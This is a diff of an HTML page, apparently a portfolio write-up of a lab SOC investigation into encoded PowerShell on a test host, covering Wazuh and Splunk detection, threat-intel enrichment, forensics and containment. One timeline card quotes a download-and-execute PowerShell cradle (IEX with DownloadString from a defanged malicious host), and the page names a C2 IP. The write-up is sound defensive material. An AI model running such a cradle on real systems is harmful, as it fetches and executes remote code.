@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" class="scroll-smooth">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,77 +7,188 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
-<script src="https://cdn.tailwindcss.com"></script>
-<script>
-tailwind.config = {
-  theme: { extend: { fontFamily: { display:['"Space Grotesk"','sans-serif'], sans:['Inter','sans-serif'], mono:['"Fira Code"','monospace'] } } }
-}
-</script>
 <style>
-:root {
-  --base:#030508; --surface:rgba(8,18,38,0.65);
-  --border:rgba(79,195,247,0.1); --border-h:rgba(79,195,247,0.35);
-  --text:#7fa8c4; --text-l:#b8d4e8; --text-b:#e8f4fd;
-  --sky:#4FC3F7; --ice:#E0F7FA; --steel:#90CAF9;
-}
-*,*::before,*::after{box-sizing:border-box;}
-html{scroll-behavior:smooth;}
-body{background:var(--base);color:var(--text);font-family:'Inter',sans-serif;overflow-x:hidden;line-height:1.75;}
-#starry-night-canvas{position:fixed;inset:0;z-index:-1;pointer-events:none;}
-#progress-bar{position:fixed;top:0;left:0;height:1px;width:0%;background:linear-gradient(90deg,var(--steel),var(--sky),var(--ice));z-index:9999;transition:width 0.1s linear;box-shadow:0 0 8px var(--sky);}
-::-webkit-scrollbar{width:6px;} ::-webkit-scrollbar-track{background:transparent;} ::-webkit-scrollbar-thumb{background:rgba(79,195,247,0.25);border-radius:3px;}
-.page-nav{position:fixed;top:0;left:0;right:0;height:56px;z-index:100;background:rgba(3,5,8,0.90);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border-bottom:1px solid rgba(79,195,247,0.08);display:flex;align-items:center;justify-content:space-between;padding:0 6%;}
+:root{--bg:#121414;--surface:#1a1a1a;--border:rgba(0,255,136,0.10);--border-h:rgba(0,255,136,0.30);--text:#6b7575;--text-l:#a8b4b2;--text-h:#e3e2e2;--accent:#00ff88;--red:#ff4444;--red-d:rgba(255,68,68,0.1);}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:auto;}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;overflow-x:hidden;line-height:1.75;cursor:none;}
+
+#cursor-dot{position:fixed;width:8px;height:8px;background:var(--accent);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:transform 0.15s;mix-blend-mode:screen;}
+#cursor-ring{position:fixed;width:36px;height:36px;border:1px solid rgba(0,255,136,0.5);border-radius:50%;pointer-events:none;z-index:9998;transform:translate(-50%,-50%);transition:width 0.25s,height 0.25s,border-color 0.25s;}
+#cursor-canvas{position:fixed;inset:0;pointer-events:none;z-index:9997;}
+#grain{position:fixed;inset:-100%;width:400%;height:400%;z-index:9996;pointer-events:none;opacity:0.035;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");animation:grain 0.6s steps(1) infinite;}
+@keyframes grain{0%,100%{transform:translate(0,0)}10%{transform:translate(-3%,-2%)}20%{transform:translate(2%,3%)}30%{transform:translate(-1%,1%)}40%{transform:translate(1%,-3%)}50%{transform:translate(-2%,2%)}60%{transform:translate(3%,-1%)}70%{transform:translate(-1%,3%)}80%{transform:translate(2%,1%)}90%{transform:translate(-3%,-1%)}}
+#progress-bar{position:fixed;top:0;left:0;height:2px;width:0%;background:linear-gradient(90deg,var(--red),rgba(255,68,68,0.3));z-index:10000;box-shadow:0 0 12px rgba(255,68,68,0.5);transition:width 0.1s linear;}
+::-webkit-scrollbar{width:4px;}::-webkit-scrollbar-track{background:transparent;}::-webkit-scrollbar-thumb{background:rgba(0,255,136,0.2);border-radius:2px;}
+
+.page-nav{position:fixed;top:0;left:0;right:0;height:56px;z-index:100;background:rgba(18,20,20,0.90);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border-bottom:1px solid rgba(255,68,68,0.07);display:flex;align-items:center;justify-content:space-between;padding:0 6%;}
 .nav-back{font-family:'Fira Code',monospace;font-size:0.72rem;letter-spacing:0.05em;color:var(--text);transition:color 0.2s;display:flex;align-items:center;gap:6px;text-decoration:none;}
-.nav-back:hover{color:var(--sky);}
-.nav-crumb{font-family:'Fira Code',monospace;font-size:0.66rem;color:var(--text);opacity:0.45;letter-spacing:0.06em;}
+.nav-back:hover{color:var(--accent);}
+.nav-crumb{font-family:'Fira Code',monospace;font-size:0.66rem;color:var(--text);opacity:0.4;letter-spacing:0.06em;}
 .nav-ext{font-family:'Fira Code',monospace;font-size:0.72rem;color:var(--text);text-decoration:none;transition:color 0.2s;}
-.nav-ext:hover{color:var(--sky);}
-.wrap{max-width:760px;margin:0 auto;padding:80px 5% 100px;}
-.glass{background:rgba(5,15,35,0.60);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:16px;padding:1.75rem;margin-bottom:1.5rem;transition:border-color 0.3s;}
-.glass:hover{border-color:rgba(79,195,247,0.18);}
-.s-title{font-family:'Space Grotesk',sans-serif;font-size:1.05rem;font-weight:600;color:var(--text-b);margin-bottom:1.2rem;display:flex;align-items:center;gap:10px;letter-spacing:-0.01em;}
+.nav-ext:hover{color:var(--accent);}
+
+/* HERO */
+.hero-section{position:relative;min-height:100vh;display:flex;align-items:flex-end;padding:0 6% 7rem;overflow:hidden;}
+.hero-section::before{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(255,68,68,0.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,68,68,0.015) 1px,transparent 1px);background-size:80px 80px;pointer-events:none;}
+.hero-section::after{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 70% 55% at 70% 20%,rgba(255,68,68,0.06) 0%,transparent 65%),linear-gradient(to bottom,transparent 40%,var(--bg) 100%);pointer-events:none;}
+.hero-inner{position:relative;z-index:2;max-width:900px;margin:0 auto;width:100%;}
+.hero-eyebrow{font-family:'Fira Code',monospace;font-size:0.68rem;color:var(--red);letter-spacing:0.18em;margin-bottom:1.5rem;opacity:0.9;display:block;}
+.hero-title{font-family:'Space Grotesk',sans-serif;font-size:clamp(2.8rem,7vw,5.8rem);font-weight:700;color:var(--text-h);line-height:0.93;letter-spacing:-0.04em;margin-bottom:1.5rem;}
+.hero-title .line{display:block;overflow:hidden;}
+.word-w{display:inline-block;overflow:hidden;vertical-align:bottom;}
+.word-i{display:inline-block;}
+@keyframes glitch-ir{0%,88%,100%{text-shadow:none;}89%{text-shadow:-3px 0 #ff0066,3px 0 var(--red);}91%{text-shadow:3px 0 #ff0066,-3px 0 var(--red);}93%{text-shadow:none;}}
+.hero-title{animation:glitch-ir 8s infinite;}
+.hero-sub{font-size:1rem;color:var(--text-l);font-weight:400;margin-bottom:2rem;line-height:1.7;max-width:640px;}
+.hero-meta{display:flex;flex-wrap:wrap;gap:1.5rem;align-items:center;font-family:'Fira Code',monospace;font-size:0.7rem;color:var(--text);opacity:0.55;margin-bottom:2rem;}
+.hero-tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
+
+/* THREAT BADGE */
+.threat-badge{display:inline-flex;align-items:center;gap:8px;font-family:'Fira Code',monospace;font-size:0.7rem;letter-spacing:0.1em;color:var(--red);border:1px solid rgba(255,68,68,0.3);border-radius:4px;padding:5px 14px;background:rgba(255,68,68,0.07);margin-bottom:1.5rem;}
+.threat-dot{width:7px;height:7px;border-radius:50%;background:var(--red);animation:threat-pulse-dot 1.4s ease-in-out infinite;}
+@keyframes threat-pulse-dot{0%,100%{box-shadow:0 0 0 0 rgba(255,68,68,0.5);}50%{box-shadow:0 0 0 8px rgba(255,68,68,0);}}
+
+/* TAGS */
+.tag{font-family:'Fira Code',monospace;font-size:0.65rem;padding:4px 12px;background:rgba(0,255,136,0.06);border:1px solid rgba(0,255,136,0.18);border-radius:4px;color:var(--accent);white-space:nowrap;display:inline-block;letter-spacing:0.04em;transition:background 0.2s,border-color 0.2s;}
+.tag:hover{background:rgba(0,255,136,0.12);border-color:rgba(0,255,136,0.35);}
+.tag-red{background:rgba(255,68,68,0.08);border-color:rgba(255,68,68,0.25);color:#ff8888;}
+
+/* HERO STAT STRIP */
+.hero-stats-strip{display:flex;gap:3rem;margin-top:1rem;}
+.h-stat-val{font-family:'Space Grotesk',sans-serif;font-size:2.2rem;font-weight:700;line-height:1;letter-spacing:-0.04em;color:var(--text-h);}
+.h-stat-val.red{color:var(--red);}
+.h-stat-label{font-family:'Fira Code',monospace;font-size:0.6rem;color:var(--text);opacity:0.6;margin-top:4px;letter-spacing:0.08em;}
+
+/* WRAP */
+.wrap{max-width:800px;margin:0 auto;padding:4rem 5% 8rem;}
+
+/* GLASS */
+.glass{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:2rem;margin-bottom:1.5rem;transition:border-color 0.35s,box-shadow 0.35s;position:relative;overflow:hidden;}
+.glass::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,255,136,0.18),transparent);opacity:0;transition:opacity 0.35s;}
+.glass:hover{border-color:var(--border-h);box-shadow:0 0 40px rgba(0,255,136,0.04);}
+.glass:hover::before{opacity:1;}
+.glass-red{border-color:rgba(255,68,68,0.15);}
+.glass-red:hover{border-color:rgba(255,68,68,0.35);box-shadow:0 0 40px rgba(255,68,68,0.05);}
+.glass-red::before{background:linear-gradient(90deg,transparent,rgba(255,68,68,0.2),transparent);}
+
+.s-title{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;font-weight:700;color:var(--text-h);margin-bottom:1.5rem;display:flex;align-items:center;gap:12px;letter-spacing:-0.02em;}
+.s-num{font-family:'Fira Code',monospace;font-size:0.7rem;color:var(--accent);opacity:0.8;flex-shrink:0;}
+.s-num-red{color:var(--red) !important;}
 .s-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--border) 0%,transparent 100%);}
-pre,.code-block{background:rgba(3,5,8,0.88);border:1px solid rgba(79,195,247,0.12);border-radius:10px;padding:1.1rem 1.25rem;font-family:'Fira Code',monospace;font-size:0.76rem;color:#b8d4e8;overflow-x:auto;line-height:1.8;margin:0.9rem 0;white-space:pre;}
-.tag{font-family:'Fira Code',monospace;font-size:0.67rem;padding:3px 10px;background:rgba(79,195,247,0.07);border:1px solid rgba(79,195,247,0.15);border-radius:4px;color:var(--sky);white-space:nowrap;display:inline-block;}
-.tag-red{background:rgba(239,68,68,0.08);border-color:rgba(239,68,68,0.25);color:#f87171;}
+
+/* ============================================================
+   HORIZONTAL TIMELINE
+   ============================================================ */
+.tl-pin-section{overflow:hidden;}
+.tl-h-viewport{height:100vh;overflow:hidden;position:relative;}
+.tl-h-track{display:flex;align-items:center;height:100%;padding:0 6vw;gap:4vw;will-change:transform;}
+.tl-h-header{flex-shrink:0;width:320px;padding-right:2rem;}
+.tl-h-label{font-family:'Fira Code',monospace;font-size:0.65rem;color:var(--accent);letter-spacing:0.16em;margin-bottom:1rem;opacity:0.8;}
+.tl-h-heading{font-family:'Space Grotesk',sans-serif;font-size:2.2rem;font-weight:700;color:var(--text-h);letter-spacing:-0.04em;line-height:1.05;margin-bottom:1rem;}
+.tl-h-sub{font-size:0.82rem;color:var(--text);line-height:1.7;}
+.tl-progress-bar{width:100%;height:2px;background:rgba(255,255,255,0.05);border-radius:1px;margin-top:1.5rem;overflow:hidden;}
+.tl-progress-fill{height:100%;background:var(--accent);width:0%;transition:width 0.1s;}
+
+/* TIMELINE CARDS */
+.tl-card{flex-shrink:0;width:340px;background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:2rem;position:relative;overflow:hidden;transition:border-color 0.3s;}
+.tl-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),transparent);}
+.tl-card-threat{border-color:rgba(255,68,68,0.25);background:rgba(26,10,10,0.9);}
+.tl-card-threat::before{background:linear-gradient(90deg,var(--red),transparent);}
+.tl-time{font-family:'Fira Code',monospace;font-size:0.7rem;color:var(--accent);letter-spacing:0.1em;margin-bottom:0.75rem;display:flex;align-items:center;gap:8px;}
+.tl-card-threat .tl-time{color:var(--red);}
+.tl-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);flex-shrink:0;}
+.tl-card-threat .tl-dot{background:var(--red);animation:threat-pulse-dot 1.4s ease-in-out infinite;}
+.tl-event-title{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;font-weight:700;color:var(--text-h);margin-bottom:0.75rem;letter-spacing:-0.025em;line-height:1.2;}
+.tl-event-body{font-size:0.82rem;color:var(--text-l);line-height:1.72;}
+.tl-badge{display:inline-block;font-family:'Fira Code',monospace;font-size:0.6rem;letter-spacing:0.08em;padding:3px 10px;border-radius:4px;margin-bottom:0.75rem;}
+.tl-badge-threat{background:rgba(255,68,68,0.12);color:#ff8888;border:1px solid rgba(255,68,68,0.3);}
+.tl-badge-ok{background:rgba(0,255,136,0.07);color:var(--accent);border:1px solid rgba(0,255,136,0.2);}
+.tl-badge-intel{background:rgba(251,191,36,0.07);color:#fde68a;border:1px solid rgba(251,191,36,0.25);}
+.tl-code{background:rgba(8,10,10,0.9);border:1px solid rgba(0,255,136,0.1);border-radius:8px;padding:0.75rem 1rem;font-family:'Fira Code',monospace;font-size:0.7rem;color:#a8b4b2;margin-top:0.75rem;line-height:1.8;overflow-x:auto;}
+.tl-card-threat .tl-code{border-color:rgba(255,68,68,0.15);}
+
+/* RED PULSE RING (threat card) */
+@keyframes red-ring{0%{box-shadow:0 0 0 0 rgba(255,68,68,0.35);}70%{box-shadow:0 0 0 18px rgba(255,68,68,0);}100%{box-shadow:0 0 0 0 rgba(255,68,68,0);}}
+.tl-card-threat.active{animation:red-ring 2s ease-out infinite;}
+
+/* SCROLL HINT */
+.scroll-hint{position:absolute;bottom:2.5rem;left:50%;transform:translateX(-50%);font-family:'Fira Code',monospace;font-size:0.62rem;color:var(--text);opacity:0.4;letter-spacing:0.1em;display:flex;align-items:center;gap:8px;animation:hint-fade 2s ease-in-out 2s both;}
+@keyframes hint-fade{0%{opacity:0}50%{opacity:0.4}100%{opacity:0}}
+
+/* METRICS */
 .metric-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:1rem;}
 @media(min-width:560px){.metric-grid{grid-template-columns:repeat(4,1fr);}}
-.metric-card{background:rgba(5,15,35,0.55);border:1px solid var(--border);border-radius:12px;padding:1.1rem;text-align:center;}
-.metric-val{font-family:'Space Grotesk',sans-serif;font-size:1.35rem;font-weight:700;color:var(--text-b);letter-spacing:-0.02em;}
-.metric-label{font-family:'Fira Code',monospace;font-size:0.62rem;color:var(--text);margin-top:4px;opacity:0.75;line-height:1.4;}
+.metric-card{background:rgba(14,16,16,0.8);border:1px solid var(--border);border-radius:12px;padding:1.5rem;text-align:center;transition:border-color 0.3s,transform 0.3s,box-shadow 0.3s;position:relative;overflow:hidden;}
+.metric-card::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 50% 0%,rgba(0,255,136,0.08) 0%,transparent 60%);opacity:0;transition:opacity 0.3s;}
+.metric-card:hover{border-color:var(--border-h);transform:translateY(-3px);box-shadow:0 8px 30px rgba(0,255,136,0.06);}
+.metric-card:hover::after{opacity:1;}
+.metric-val{font-family:'Space Grotesk',sans-serif;font-size:1.8rem;font-weight:700;color:var(--text-h);letter-spacing:-0.04em;line-height:1;}
+.metric-label{font-family:'Fira Code',monospace;font-size:0.6rem;color:var(--text);margin-top:8px;line-height:1.5;opacity:0.85;}
+
+/* WAZUH ALERT CARD */
+.alert-card{background:rgba(255,68,68,0.05);border:1px solid rgba(255,68,68,0.2);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.alert-header{font-family:'Fira Code',monospace;font-size:0.68rem;color:#ff8888;letter-spacing:0.1em;margin-bottom:0.75rem;opacity:0.85;}
+.alert-row{display:flex;gap:1rem;padding:3px 0;font-size:0.82rem;}
+.alert-key{color:var(--text);opacity:0.65;flex-shrink:0;width:120px;}
+.alert-val{color:var(--text-l);}
+.alert-val.critical{color:#f87171;font-weight:600;}
+
+pre,.code-block{background:rgba(8,10,10,0.95);border:1px solid rgba(0,255,136,0.12);border-radius:10px;padding:1rem 1.25rem;font-family:'Fira Code',monospace;font-size:0.75rem;color:#a8b4b2;overflow-x:auto;line-height:1.85;margin:0.9rem 0;white-space:pre;}
+
+/* TIMELINE (vertical, inside wrap) */
 .timeline{position:relative;padding-left:1.5rem;}
-.timeline::before{content:'';position:absolute;left:0;top:4px;bottom:4px;width:1px;background:linear-gradient(to bottom,rgba(79,195,247,0.4),transparent);}
+.timeline::before{content:'';position:absolute;left:0;top:4px;bottom:4px;width:1px;background:linear-gradient(to bottom,rgba(0,255,136,0.4),transparent);}
 .tl-item{position:relative;padding:0 0 1.6rem 1.25rem;}
-.tl-item::before{content:'';position:absolute;left:-4.5px;top:5px;width:10px;height:10px;border-radius:50%;background:var(--base);border:2px solid var(--sky);box-shadow:0 0 8px rgba(79,195,247,0.4);}
-.tl-time{font-family:'Fira Code',monospace;font-size:0.68rem;color:var(--sky);margin-bottom:4px;}
-.tl-title{font-family:'Space Grotesk',sans-serif;font-size:0.92rem;font-weight:600;color:var(--text-b);margin-bottom:0.4rem;}
-.tl-body{font-size:0.84rem;color:var(--text-l);line-height:1.7;}
+.tl-item::before{content:'';position:absolute;left:-4.5px;top:5px;width:10px;height:10px;border-radius:50%;background:var(--bg);border:2px solid var(--accent);box-shadow:0 0 8px rgba(0,255,136,0.4);}
+.tl-item-threat::before{border-color:var(--red);box-shadow:0 0 10px rgba(255,68,68,0.5);}
+.tl-time-v{font-family:'Fira Code',monospace;font-size:0.68rem;color:var(--accent);margin-bottom:4px;}
+.tl-item-threat .tl-time-v{color:var(--red);}
+.tl-title-v{font-family:'Space Grotesk',sans-serif;font-size:0.92rem;font-weight:600;color:var(--text-h);margin-bottom:0.4rem;}
+.tl-body-v{font-size:0.84rem;color:var(--text-l);line-height:1.7;}
+
+/* MITRE */
+.mitre-grid{display:grid;grid-template-columns:1fr;gap:0.75rem;}
+@media(min-width:560px){.mitre-grid{grid-template-columns:repeat(2,1fr);}}
+.mitre-card{background:rgba(14,16,16,0.6);border:1px solid var(--border);border-radius:10px;padding:1rem;transition:border-color 0.3s;}
+.mitre-card:hover{border-color:var(--border-h);}
+.mitre-id{font-family:'Fira Code',monospace;font-size:0.66rem;color:var(--accent);margin-bottom:3px;}
+.mitre-name{font-family:'Space Grotesk',sans-serif;font-size:0.88rem;font-weight:600;color:var(--text-h);margin-bottom:2px;}
+.mitre-tactic{font-size:0.72rem;color:var(--text);opacity:0.65;margin-bottom:6px;}
+.mitre-desc{font-size:0.8rem;color:var(--text-l);line-height:1.6;}
+
+/* IOC TABLE */
+.ioc-table{width:100%;border-collapse:collapse;font-size:0.8rem;font-family:'Fira Code',monospace;}
+.ioc-table th{text-align:left;padding:8px 12px;color:var(--accent);font-size:0.68rem;letter-spacing:0.08em;border-bottom:1px solid var(--border);font-weight:400;}
+.ioc-table td{padding:8px 12px;color:var(--text-l);border-bottom:1px solid rgba(0,255,136,0.05);vertical-align:top;line-height:1.5;}
+.ioc-table tr:last-child td{border-bottom:none;}
+
+/* BULLETS */
+.bullet-list{list-style:none;padding:0;}
+.bullet-list li{display:flex;align-items:flex-start;gap:10px;padding:0.35rem 0;font-size:0.87rem;color:var(--text-l);line-height:1.65;}
+.bullet-list li::before{content:'▹';color:var(--accent);flex-shrink:0;margin-top:1px;font-size:0.78rem;}
+
 .alert-box{border-radius:10px;padding:1rem 1.25rem;margin:0.9rem 0;font-size:0.84rem;}
 .alert-danger{background:rgba(239,68,68,0.07);border:1px solid rgba(239,68,68,0.22);color:#fca5a5;}
 .alert-warning{background:rgba(251,191,36,0.07);border:1px solid rgba(251,191,36,0.22);color:#fde68a;}
 .alert-success{background:rgba(74,222,128,0.07);border:1px solid rgba(74,222,128,0.22);color:#86efac;}
-.alert-info{background:rgba(79,195,247,0.07);border:1px solid rgba(79,195,247,0.2);color:#7dd3fc;}
-.mitre-grid{display:grid;grid-template-columns:1fr;gap:0.75rem;}
-@media(min-width:560px){.mitre-grid{grid-template-columns:repeat(2,1fr);}}
-.mitre-card{background:rgba(5,15,35,0.5);border:1px solid var(--border);border-radius:10px;padding:1rem;}
-.mitre-id{font-family:'Fira Code',monospace;font-size:0.66rem;color:var(--sky);margin-bottom:3px;}
-.mitre-name{font-family:'Space Grotesk',sans-serif;font-size:0.88rem;font-weight:600;color:var(--text-b);margin-bottom:2px;}
-.mitre-tactic{font-size:0.72rem;color:var(--text);opacity:0.65;margin-bottom:6px;}
-.mitre-desc{font-size:0.80rem;color:var(--text-l);line-height:1.6;}
-.bullet-list{list-style:none;padding:0;}
-.bullet-list li{display:flex;align-items:flex-start;gap:10px;padding:0.32rem 0;font-size:0.86rem;color:var(--text-l);line-height:1.6;}
-.bullet-list li::before{content:'▹';color:var(--sky);flex-shrink:0;margin-top:1px;font-size:0.78rem;}
-.ioc-table{width:100%;border-collapse:collapse;font-size:0.8rem;font-family:'Fira Code',monospace;}
-.ioc-table th{text-align:left;padding:8px 12px;color:var(--sky);font-size:0.68rem;letter-spacing:0.08em;border-bottom:1px solid var(--border);font-weight:400;}
-.ioc-table td{padding:8px 12px;color:var(--text-l);border-bottom:1px solid rgba(79,195,247,0.05);vertical-align:top;line-height:1.5;}
-.ioc-table tr:last-child td{border-bottom:none;}
-.check{color:#4ade80;} .cross{color:#f87171;}
+.alert-info{background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.18);color:#9df5c5;}
+
+.btn-outline{font-family:'Fira Code',monospace;font-size:0.75rem;letter-spacing:0.08em;padding:12px 32px;border:1px solid rgba(0,255,136,0.35);color:var(--accent);border-radius:8px;transition:border-color 0.3s,box-shadow 0.3s;display:inline-block;text-decoration:none;background:transparent;position:relative;overflow:hidden;cursor:none;}
+.btn-outline::before{content:'';position:absolute;inset:0;background:rgba(0,255,136,0.08);transform:scaleX(0);transform-origin:left;transition:transform 0.3s ease;}
+.btn-outline:hover::before{transform:scaleX(1);}
+.btn-outline:hover{border-color:rgba(0,255,136,0.6);box-shadow:0 0 24px rgba(0,255,136,0.12);}
+
 footer{text-align:center;padding:2rem 5%;font-family:'Fira Code',monospace;font-size:0.68rem;color:var(--text);opacity:0.4;border-top:1px solid var(--border);}
+.mt-2{margin-top:0.5rem;}.mt-3{margin-top:0.75rem;}.mt-4{margin-top:1rem;}.mb-4{margin-bottom:1rem;}.mb-6{margin-bottom:1.5rem;}.mb-8{margin-bottom:2rem;}.mt-10{margin-top:2.5rem;}
 </style>
 </head>
 <body>
 
-<canvas id="starry-night-canvas" aria-hidden="true"></canvas>
+<div id="cursor-dot"></div>
+<div id="cursor-ring"></div>
+<canvas id="cursor-canvas"></canvas>
+<div id="grain" aria-hidden="true"></div>
 <div id="progress-bar" aria-hidden="true"></div>
 
 <nav class="page-nav">
@@ -89,30 +200,108 @@ footer{text-align:center;padding:2rem 5%;font-family:'Fira Code',monospace;font-
   <a href="https://github.com/karim871" target="_blank" rel="noopener noreferrer" class="nav-ext">GitHub ↗</a>
 </nav>
 
-<main class="wrap">
-
-  <!-- HERO -->
-  <div class="mb-10">
-    <div class="flex flex-wrap items-center gap-3 mb-5">
-      <span class="tag tag-red" style="font-size:0.7rem;padding:4px 12px;letter-spacing:0.06em;">⬤ HIGH SEVERITY</span>
+<!-- HERO -->
+<section class="hero-section" id="hero">
+  <div class="hero-inner">
+    <div class="threat-badge"><span class="threat-dot"></span> HIGH SEVERITY — ACTIVE INVESTIGATION</div>
+    <span class="hero-eyebrow">PROJECTS / SOC / INCIDENT RESPONSE</span>
+    <div class="hero-tags">
+      <span class="tag tag-red">⬤ HIGH SEVERITY</span>
       <span class="tag">Incident Response</span>
-      <span class="tag">MITRE ATT&CK</span>
+      <span class="tag">MITRE ATT&amp;CK</span>
       <span class="tag">Threat Detection</span>
     </div>
-    <h1 style="font-family:'Space Grotesk',sans-serif;font-size:clamp(1.7rem,4vw,2.4rem);font-weight:700;color:var(--text-b);line-height:1.1;letter-spacing:-0.03em;margin-bottom:1rem;">
-      Detecting Suspicious PowerShell Activity:<br>A Real SOC Investigation
+    <h1 class="hero-title" id="hero-title">
+      <span class="line" id="hl1">Detecting Suspicious</span>
+      <span class="line" id="hl2">PowerShell Activity:</span>
+      <span class="line" id="hl3">A Real SOC Investigation</span>
     </h1>
-    <div class="flex flex-wrap gap-4 items-center" style="font-family:'Fira Code',monospace;font-size:0.7rem;color:var(--text);opacity:0.7;">
+    <p class="hero-sub">December 10, 2024 — encoded PowerShell detected on WIN-LAB-01. From first alert to full containment in 42 minutes. Every step documented.</p>
+    <div class="hero-meta">
       <span>December 10, 2024</span>
-      <span>·</span>
+      <span style="opacity:0.3">·</span>
       <span>8 min read</span>
-      <span>·</span>
+      <span style="opacity:0.3">·</span>
       <span>Controlled lab exercise — Atomic Red Team</span>
     </div>
+    <div class="hero-stats-strip">
+      <div><div class="h-stat-val">2m 15s</div><div class="h-stat-label">TIME TO DETECTION</div></div>
+      <div><div class="h-stat-val red">42 min</div><div class="h-stat-label">TIME TO CONTAINMENT</div></div>
+      <div><div class="h-stat-val">4</div><div class="h-stat-label">MITRE TECHNIQUES</div></div>
+    </div>
   </div>
+  <div class="scroll-hint">scroll to investigate ↓</div>
+</section>
 
-  <!-- METRICS -->
-  <div class="metric-grid mb-8">
+<!-- ============================================================
+     HORIZONTAL TIMELINE SECTION
+============================================================ -->
+<div class="tl-pin-section" id="tl-pin-section">
+  <div class="tl-h-viewport" id="tl-viewport">
+    <div class="tl-h-track" id="tl-track">
+
+      <!-- Header card -->
+      <div class="tl-h-header">
+        <div class="tl-h-label">INVESTIGATION TIMELINE</div>
+        <div class="tl-h-heading">42 Minutes.<br>Full<br>Containment.</div>
+        <div class="tl-h-sub">Scroll through each phase of the investigation — from first alert to remediation.</div>
+        <div class="tl-progress-bar"><div class="tl-progress-fill" id="tl-prog"></div></div>
+      </div>
+
+      <!-- CARD 1: T+0:00 — THREAT DETECTED -->
+      <div class="tl-card tl-card-threat" id="tl-card-0">
+        <span class="tl-badge tl-badge-threat">⚠ THREAT DETECTED</span>
+        <div class="tl-time"><span class="tl-dot"></span>T+0:00</div>
+        <div class="tl-event-title">Alert Received &amp; Initial Triage</div>
+        <div class="tl-event-body">Wazuh Rule 91816 fires on WIN-LAB-01. Alert opened in Splunk. Base64 payload decoded manually — IEX download chain + schtasks persistence identified. Severity escalated to High.</div>
+        <div class="tl-code">powershell.exe -EncodedCommand
+  SQBFAFgAIAAoAE4AZQB3AC0AT...
+→ IEX (New-Object Net.WebClient)
+    .DownloadString('http://malicious[.]com/stage2.ps1')</div>
+      </div>
+
+      <!-- CARD 2: T+0:05 -->
+      <div class="tl-card">
+        <span class="tl-badge tl-badge-ok">LOG CORRELATION</span>
+        <div class="tl-time"><span class="tl-dot" style="background:rgba(0,255,136,0.6);"></span>T+0:05</div>
+        <div class="tl-event-title">Multi-Source Log Correlation</div>
+        <div class="tl-event-body">Splunk query across Wazuh, Suricata, and Windows event indexes. Found 3 additional PowerShell executions within 2-minute window. Suricata detected HTTP outbound to 185.220.101.42. Event ID 4698 confirmed scheduled task creation.</div>
+        <div class="tl-code">index=suricata OR index=wazuh host="WIN-LAB-01"
+| eval _time=strptime(timestamp,"%Y-%m-%dT%H:%M:%S")
+| sort _time | table _time,src_ip,dest_ip,alert.signature</div>
+      </div>
+
+      <!-- CARD 3: T+0:12 -->
+      <div class="tl-card">
+        <span class="tl-badge tl-badge-intel">THREAT INTEL</span>
+        <div class="tl-time"><span class="tl-dot" style="background:rgba(251,191,36,0.7);"></span>T+0:12</div>
+        <div class="tl-event-title">Threat Intelligence Enrichment</div>
+        <div class="tl-event-body">C2 IP 185.220.101.42 enriched via CyberOps Sidekick. AbuseIPDB: 100/100 confidence, 47 reports. VirusTotal: 8/92 flagged malicious. AlienVault OTX: linked to commodity malware campaigns. Domain registered 3 days prior to incident.</div>
+      </div>
+
+      <!-- CARD 4: T+0:25 -->
+      <div class="tl-card">
+        <span class="tl-badge tl-badge-ok">HOST FORENSICS</span>
+        <div class="tl-time"><span class="tl-dot" style="background:rgba(0,255,136,0.6);"></span>T+0:25</div>
+        <div class="tl-event-title">Host Forensics &amp; Evidence Collection</div>
+        <div class="tl-event-body">Windows Event Log and Sysmon analysis. Event ID 4688: powershell.exe (parent: cmd.exe). Sysmon Event ID 1: full command line captured. Event ID 4698: "SystemUpdate" task created. File write: C:\Users\Public\update.ps1 confirmed.</div>
+      </div>
+
+      <!-- CARD 5: T+0:42 -->
+      <div class="tl-card" style="border-color:rgba(0,255,136,0.2);">
+        <span class="tl-badge tl-badge-ok">CONTAINED</span>
+        <div class="tl-time"><span class="tl-dot"></span>T+0:42</div>
+        <div class="tl-event-title">Containment &amp; Remediation</div>
+        <div class="tl-event-body">Host isolated via firewall egress block. PID 4892 terminated. Malicious script deleted. "SystemUpdate" scheduled task removed. Forensic evidence collected: memory dump, logs, registry hive. Incident closed.</div>
+      </div>
+
+    </div><!-- /tl-track -->
+  </div><!-- /tl-viewport -->
+</div><!-- /tl-pin-section -->
+
+<main class="wrap">
+
+  <div class="metric-grid mb-8" id="metrics">
     <div class="metric-card">
